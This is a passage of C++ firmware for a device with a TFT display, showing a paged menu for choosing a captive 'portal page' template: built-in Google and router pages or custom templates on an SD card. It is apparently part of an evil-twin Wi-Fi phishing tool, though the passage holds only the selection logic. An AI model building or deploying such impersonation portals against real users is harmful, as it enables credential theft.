    // index 0/1 = built-in templates, 2.. = SD templates
    int  total  = 2 + sdCount;
    int  page   = 0;
    int  pages  = (total + ET_PER_PAGE - 1) / ET_PER_PAGE;
    bool redraw = true;

    while (true) {
        if (redraw) {
            dm.clearScreen();
            dm.setDefaultTextSize();
            dm.setCursor(4, outputY);
            dm.setTextColor(TFT_CYAN);
            dm.println("Pick portal page:");

            int start = page * ET_PER_PAGE;
            int end   = min(start + ET_PER_PAGE, total);
            for (int i = start; i < end; i++) {
                char label[40];
                bool isCurrent;
                if (i == 0) {
                    strcpy(label, "Google (built-in)");
                    isCurrent = !_useCustomTemplate && _tmpl == 0;
                } else if (i == 1) {
                    strcpy(label, "Router (built-in)");
                    isCurrent = !_useCustomTemplate && _tmpl == 1;
                } else {
                    snprintf(label, sizeof(label), "%.36s", names[i - 2]);
                    isCurrent = _useCustomTemplate &&
                                strcmp(_sdTemplateName, names[i - 2]) == 0;
                }
                dm.setCursor(4, dm.getCursorY());
                dm.setTextColor(isCurrent ? TFT_GREEN : TFT_WHITE);
                char buf[52];
                snprintf(buf, sizeof(buf), "%s[%d] %s",
                         isCurrent ? "> " : "  ", i - start + 1, label);
                dm.println(buf);
            }

            if (sdCount == 0) {
                dm.setCursor(4, dm.getCursorY());
                dm.setTextColor(TFT_DARKGREY);
                dm.println("(no SD templates found)");
            }

            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF);
            char nav[48];
            snprintf(nav, sizeof(nav), "[n]ext [p]rev [q]uit  pg %d/%d", page + 1, pages);
            dm.println(nav);
            redraw = false;
        }

        char k = inputHandler.getKeyboardInput();
        if (!k) { delay(20); continue; }
        if (k == 'q' || k == 'Q') return false;
        if ((k == 'n' || k == 'N') && page < pages - 1) { page++; redraw = true; continue; }
        if ((k == 'p' || k == 'P') && page > 0)         { page--; redraw = true; continue; }

        if (k >= '1' && k <= '0' + ET_PER_PAGE) {
            int idx = page * ET_PER_PAGE + (k - '1');
            if (idx >= total) continue;

            if (idx == 0) {
                _useCustomTemplate = false;
                _tmpl = 0;
                strcpy(_uiNoticeText, "Portal: Google (built-in)");
            } else if (idx == 1) {
                _useCustomTemplate = false;
                _tmpl = 1;
                strcpy(_uiNoticeText, "Portal: Router (built-in)");
            } else {
                int sdIdx = idx - 2;
                snprintf(_sdTemplatePath, sizeof(_sdTemplatePath),
                         ET_PORTAL_DIR "/%s", names[sdIdx]);
                strncpy(_sdTemplateName, names[sdIdx], 31);
                _sdTemplateName[31] = '\0';
                _useCustomTemplate  = true;
                snprintf(_uiNoticeText, sizeof(_uiNoticeText), "Portal: %.30s", _sdTemplateName);
            }
            _uiNoticeMs    = millis();
            _uiNoticeColor = TFT_GREEN;
            return true;
        }
    }
}
